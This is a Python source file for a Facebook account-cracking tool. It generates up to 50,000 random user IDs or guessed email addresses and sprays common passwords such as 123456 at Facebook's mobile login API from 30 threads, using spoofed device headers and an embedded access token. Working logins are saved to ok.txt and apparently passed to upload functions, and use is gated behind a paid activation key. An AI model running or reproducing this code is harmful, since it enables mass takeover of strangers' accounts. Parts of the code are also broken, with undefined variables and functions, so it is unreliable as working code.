W = '\033[97;1m' 
R = '\033[91;1m'  #بنفسجي غامق
G = '\033[92;1m'  #اخضر
Y = '\033[93;1m'  #اصفر
B = '\033[94;1m'  #بنفسجي غامق
P = '\033[95;1m'   #بنفسجي
C = '\033[96;1m'  #ازرق
N = '\x1b[0m'  #ابيض
T = '\x1b[38;5;208m' #برتقالي
logos = ("""              \x1b[38;5;208m                Welcome To admin 
  ______   __  __              _____     _      _     
 |  ____| |  \/  |     /\     |  __ \   | |    | |    
 | |__    | \  / |    /  \    | |  | |  | | __ | |__  
 |  __|   | |\/| |   / /\ \   | |  | |  | |/ / | '_ \ 
 | |____  | |  | |  / ____ \  | |__| |  |   < _| | | |
 |______| |_|  |_| /_/    \_\ |_____/   |_|\_(_)_| |_|
 Emad-Alkhashn  v.1                                                                  
     """)
     
logoz = ("""  \033[93;1m

 _                   _         
| |                 (_)        
| |   ___     __ _   _   _ __  
| |  / _ \   / _` | | | | '_ \ 
| | | (_) | | (_| | | | | | | |
|_|  \___/   \__, | |_| |_| |_|
              __/ |            
             |___/             
""")

import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
import webbrowser
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)



def helpnote():
	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://github.com/EmadAlkhashn/test/blob/main/a.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/3mad4")


def notice():

 

	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
	runtxt("\033[0;93m FOR FREE APPROVAL SEND THIS KEY TO ADMIN >> %s%s"%(basesplit))
	runtxt("\033[0;92m BYPASS ADMIN MESSENGER >> m.me/3mad4")
	subprocess.check_output(["am", "start", "https://m.me/3mad4"])


        
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		try:
			plr = requests.get('https://github.com/EmadAlkhashn/key/blob/main/a.txt').text
			os.system("clear")
			if basesplit in plr:
				key = basesplit
			else:
				runtxt(logoz)
				runtxt("""══════════════════════════════════════════════════════""")
				runtxt(" Send this code to the admin Emad to activate the tool   ")
				print("")
				runtxt("          👉  "+basesplit)
				time.sleep(3)
				webbrowser.open("https://m.me/3mad4")
				exit()
		except requests.exceptions.ConnectionError:
			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
			exit()
		os.system("clear")
		print("")
		print (logos)

		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
		print("%s [%s1%s]%s CRACK RANDOM FB ID%s 2012-15 "%(R,G,R,T,Y))
		print("%s [%s2%s]%s CRACK RANDOM FB ID%s 2011-13 "%(R,G,R,T,Y))
		print("%s [%s3%s]%s CRACK RANDOM FB ID%s 2008-11 "%(R,G,R,T,Y))
		print("%s [%s4%s]%s CRACK RANDOM FB ID%s 2009    "%(R,G,R,T,Y))
		print("%s [%s5%s]%s CRACK RANDOM FB ID%s 2005-7 "%(R,G,R,T,Y))
		print("%s [%s6%s]%s CRACK RANDOM FB ID%s 2004-6 "%(R,G,R,T,Y))
		print("%s [%s7%s]%s CRACK RANDOM FB ID%s 2004-5 "%(R,G,R,T,Y))
		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
		hoga = input("\x1b[38;5;208m [☆] CRACK :  ")
		if hoga in ["", " "]:
			Main()
		elif hoga in ["1", "01"]:
			self.old_11()
		elif hoga in ["2", "02"]:
			self.old_11()
		elif hoga in ["3", "03"]:
			self.shanto9()
		elif hoga in ["4", "04"]:
			self.oldcrack()
		elif hoga in ["5", "05"]:
			self.old4_7()
		elif hoga in ["6", "06"]:
			self.old4_6()
		elif hoga in ["7", "07"]:
			self.old4_5()
		elif hoga in ["8", "08"]:
			self.shanto4()
		elif hoga in ["9", "09"]:
			self.email()
		elif hoga in ["10","১০"]:
			self.oldcrack()
		elif hoga in ["P", "p"]:
			notice()
			exit()
		else:
			Main()

	def shanto9(self):
		x = 111111111
		xx = 999999999
		idx = "100000"
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s DON'T CROSS THE LIMIT BRO (50000) "%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [☆] ENTER PASSWORD : %s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def shanto4(self):
		x = 1111111
		xx = 9999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old4_7(self):
		x = 11111111
		xx = 99999999
		#idx = input("%s [☆] ENTER A DIGIT (1-9): %s"%(T,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		


	def old4_6(self):
		x = 1111111
		xx = 9999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(T,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old4_5(self):
		x = 111111
		xx = 999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(T,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("") 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		

	def old_11(self):
		x = 1111111111111
		xx = 9999999999999
		idx = "50000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(50000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old_13(self):
		x = 1111111111111
		xx = 9999999999999
		idx = "1000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(50000 MAX): \033[0;92m"))
		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))


	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Abir): "%(T,G))
		nam = nam.replace(" ", "")
		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
		idx = input("%s DOMAIN  : "%(B))
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(50000 MAX): \033[0;92m"))
		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				___ = nam
				self.id.append(___+str(_)+__)
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = " 1000000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(50000 MAX): \033[0;92m"))
		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
			print("")
			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
				print("")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
			"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
			"Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]"
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3"
            "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36"
            "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3"
            "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
            "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
            "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1"
            "Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1"
            "Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3"
		])
		sys.stdout.write(
			"\r\r %s\x1b[38;5;208m[☆] ︻╦̵̵̿╤── : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[BY-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [BY-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[BY-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [BY-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))